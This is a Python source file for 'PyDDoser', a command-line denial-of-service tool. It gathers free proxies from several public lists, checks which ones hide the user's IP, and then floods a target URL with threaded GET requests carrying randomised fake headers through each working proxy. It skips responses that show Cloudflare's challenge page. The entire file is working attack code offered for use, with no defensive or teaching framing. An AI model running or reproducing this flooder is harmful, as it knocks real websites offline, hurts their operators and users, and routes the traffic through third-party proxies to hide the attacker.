import requests as r, os, threading, random, click, fake_headers
from threading import Thread
from colorama import Fore, Style, Back
from fake_headers import Headers
version = '1.1.6 stable :.:.'

iphosts = [
    'https://wtfismyip.com/text',
    'https://ipinfo.io/ip',
    'https://ipv4.icanhazip.com/',
    'https://myexternalip.com/raw',
    'https://ifconfig.io/ip',
    'https://ipecho.net/plain'
]

global myip
myip = r.post(random.choice(iphosts)).text

class bcolors:
	OKGREEN = '\033[92m'
	WARNING = '\033[0;33m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'
	LITBU = '\033[94m'
	YELLOW = '\033[3;33m'
	CYAN = '\033[0;36'
	colors = ['\033[92m', '\033[91m', '\033[0;33m']
	RAND = random.choice(colors)


def clear(): 
	if os.name == 'nt': 
		os.system('cls') 
	else: 
		os.system('clear')

def logo():
	print(bcolors.OKGREEN + '██████╗░██╗░░░██╗██████╗░██████╗░░█████╗░░██████╗███████╗██████╗░')
	print(bcolors.OKGREEN + '██╔══██╗╚██╗░██╔╝██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔════╝██╔══██╗')
	print(bcolors.OKGREEN + '██████╔╝░╚████╔╝░██║░░██║██║░░██║██║░░██║╚█████╗░█████╗░░██████╔╝')
	print(bcolors.OKGREEN + '██╔═══╝░░░╚██╔╝░░██║░░██║██║░░██║██║░░██║░╚═══██╗██╔══╝░░██╔══██╗')
	print(bcolors.OKGREEN + '██║░░░░░░░░██║░░░██████╔╝██████╔╝╚█████╔╝██████╔╝███████╗██║░░██║')
	print(bcolors.OKGREEN + '╚═╝░░░░░░░░╚═╝░░░╚═════╝░╚═════╝░░╚════╝░╚═════╝░╚══════╝╚═╝░░╚═╝')
	print('')
	print(bcolors.WARNING + '               .:.: Developer:  :.:.')
	print(bcolors.WARNING + '           .:.: Version: '+version)
	print('')

def check_prox(array, url):
	#myip = r.post(random.choice(iphosts)).text
	for prox in array:
		#thread_list = []
		t = threading.Thread(target=check, args=(myip, prox, url))
		#thread_list.append(t)
		t.start()

def check(myip, prox, url):
	try:
		ipx = r.get(random.choice(iphosts), proxies={'http': "http://{}".format(prox), 'https':"http://{}".format(prox)}).text
		if ipx == myip:
			pass
		else:
			print(Fore.BLACK+Back.GREEN+"{} good proxy".format(prox)+Style.RESET_ALL)
			#thread_list = []
			t = threading.Thread(target=ddos, args=(prox, url))
			#thread_list.append(t)
			t.start()
	except:
		pass

def ddos(prox, url):
	proxies={"http":"http://{}".format(prox), "https":"http://{}".format(prox)}
	colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.CYAN, Fore.MAGENTA, Fore.WHITE]
	color = random.choice(colors)
	while True:
		headers = Headers(headers=True).generate()
		#thread_list = []
		t = threading.Thread(target=start_ddos, args=(prox, url, headers, proxies, color))
		#thread_list.append(t)
		t.start()

def start_ddos(prox, url, headers, proxies, color):
	try:
		s = r.Session()
		req = s.get(url, headers=headers, proxies=proxies)
		if req.status_code == 200:
			if "<title>Just a moment...</title>" in req.text:
				pass
			else:
				print(color+"{} sent requests...".format(prox))
	except:
		pass

@click.command()
@click.option('--proxy', '-p', help="<File with a proxy>")
@click.option('--url', '-u', help="<URL>")
def main(proxy, url):
	clear()
	logo()
	if url == None:
		print(bcolors.LITBU + "Enter the full URL example: https://google.com")
		url = input(bcolors.LITBU + "URL site: ")
	if url[:4] != "http":
		print(Fore.RED+"Enter the full URL (example: https://google.com/)"+Style.RESET_ALL)
		exit()
	if proxy == None:
		while True:
			req1 = r.get("https://api.proxyscrape.com/v2/?request=displayproxies").text
			req2 = r.get("https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt").text
			req3 = r.get("https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt").text
			req4 = r.get("https://raw.githubusercontent.com/UptimerBot/proxy-list/master/proxies/http.txt").text
			req5 = r.get("https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt").text
			req6 = r.get("https://raw.githubusercontent.com/tahaluindo/Free-Proxies/main/proxies/raw.txt").text
			req7 = r.get("https://raw.githubusercontent.com/ObcbO/getproxy/master/http.txt").text
			req7 = req7.replace("https://", "")
			req7 = req7.replace("http://", "")
			req8 = r.get("https://raw.githubusercontent.com/yuceltoluyag/GoodProxy/main/raw.txt").text
			req = req1 + req2 + req3 + req4 + req5 + req6 + req7 + req8
			array = req.split()
			print(Back.YELLOW+Fore.WHITE+"Found {} new proxies".format(len(array))+Style.RESET_ALL)
			check_prox(array, url)
	else:
		try:
			fx = open(proxy)
			array = fx.read().split()
			print("Found {} proxies in {}.\nChecking proxies...".format(len(array), proxy))
			check_prox(array, url)
		except FileNotFoundError:
			print(Fore.RED+"File {} not found.".format(proxy)+Style.RESET_ALL)
			exit()

main()
